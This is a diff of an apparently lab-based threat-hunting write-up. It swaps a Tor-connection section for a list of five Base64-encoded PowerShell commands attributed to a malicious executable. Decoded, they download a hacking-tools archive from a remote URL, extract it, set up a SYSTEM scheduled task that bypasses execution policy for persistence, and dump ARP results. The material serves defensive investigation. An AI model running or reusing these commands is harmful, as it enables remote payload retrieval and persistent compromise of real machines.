@@ -107,24 +107,21 @@ DeviceProcessEvents
 ```
 ![image](https://github.com/user-attachments/assets/9f2cecd1-07a5-4715-9f00-423c924fdd86)
 
-
 ---
 
-### 4. Searched the `DeviceProcessEvents` Table for Malicious Script Activity
+### 4. Deciphering `MaliciousExecutable.exe`'s Encoded PowerShell Commands
 
-Searched for any indication the TOR browser was used to establish a connection using any of the known TOR ports. At `2025-03-05T01:07:24.7605276Z`, an employee on the 'arm-threathunti' device successfully established a connection to the remote IP address `45.142.177.89` on port `443`. The connection was initiated by the process `tor.exe`, located in the folder `C:\users\aaronmart\desktop\tor browser\browser\torbrowser\tor\tor.exe`. There were a couple of other connections to sites over port `443` and '9001'.
+Five encoded PowerShell commands associated with `MaliciousExecutable.exe` were logged and displayed. The logged encoded PowerShell commands were:
 
-**Query used to locate events:**
+1. `"SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBBAGEAcgBvAG4AUgBNAGEAcgB0AGkAbgBlAHoALwBUAGgAcgBlAGEAdAAtAEgAdQBuAHQAaQBuAGcALQBTAGMAZQBuAGEAcgBpAG8ALQBDAG8AbQBwAHIAbwBtAGkAcwBlAC8AcgBhAHcALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAEgAYQBjAGsAaQBuAGcAVABvAG8AbABzAC4AegBpAHAAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEQAbwB3AG4AbABvAGEAZABzAFwASABhAGMAawBpAG4AZwBUAG8AbwBsAHMALgB6AGkAcAAiAA==`
 
-```kql
-DeviceNetworkEvents
-| where DeviceName == "arm-threathunti"
-| where InitiatingProcessAccountName != "system"
-| where RemotePort in ("80", "443", "9001", "9030", "9040", "9050", "9051", "9150")
-| project Timestamp, DeviceName, InitiatingProcessAccountName, ActionType, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessFileName
-| order by Timestamp desc
-```
-![image](https://github.com/user-attachments/assets/4757d3cd-b515-4a23-8a78-2f2aec559de6)
+2. `RQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAALQBQAGEAdABoACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwARABvAHcAbgBsAG8AYQBkAHMAXABIAGEAYwBrAGkAbgBnAFQAbwBvAGwAcwAuAHoAaQBwACIAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgBQAGEAdABoACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwARABvAHcAbgBsAG8AYQBkAHMAXABIAGEAYwBrAGkAbgBnAFQAbwBvAGwAcwAiACAALQBGAG8AcgBjAGUA`
+
+3. `UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwARABvAHcAbgBsAG8AYQBkAHMAXABIAGEAYwBrAGkAbgBnAFQAbwBvAGwAcwAuAHoAaQBwACIAIAAtAEYAbwByAGMAZQA=`
+
+4. `cwBjAGgAdABhAHMAawBzACAALwBjAHIAZQBhAHQAZQAgAC8AdABuACAAIgBQAGUAcgBzAGkAcwB0AGUAbgBjAGUAUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAiACAALwB0AHIAIAAiAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0ARgBpAGwAZQAgACQAZQBuAHYAOgBVAFMARQBSAFAAUgBPAEYASQBMAEUAXABEAG8AdwBuAGwAbwBhAGQAcwBcAEgAYQBjAGsAaQBuAGcAVABvAG8AbABzAFwASABhAGMAawBpAG4AZwBUAG8AbwBsAHMAXABQAGUAcgBzAGkAcwB0AGUAbgBjAGUAUwBjAHIAaQBwAHQALgBwAHMAMQAiACAALwBzAGMAIABvAG4AbABvAGcAbwBuACAALwByAHUAIABTAFkAUwBUAEUATQAgAC8AZgA=`
+
+5. `YQByAHAAIAAtAGEAIAB8ACAATwB1AHQALQBGAGkAbABlACAALQBGAGkAbABlAFAAYQB0AGgAIAAiACQAZQBuAHYAOgBVAFMARQBSAFAAUgBPAEYASQBMAEUAXABEAGUAcwBrAHQAbwBwAFwAYQByAHAAXwByAGUAcwB1AGwAdABzAC4AdAB4AHQAIgA=`
 
 ---
 
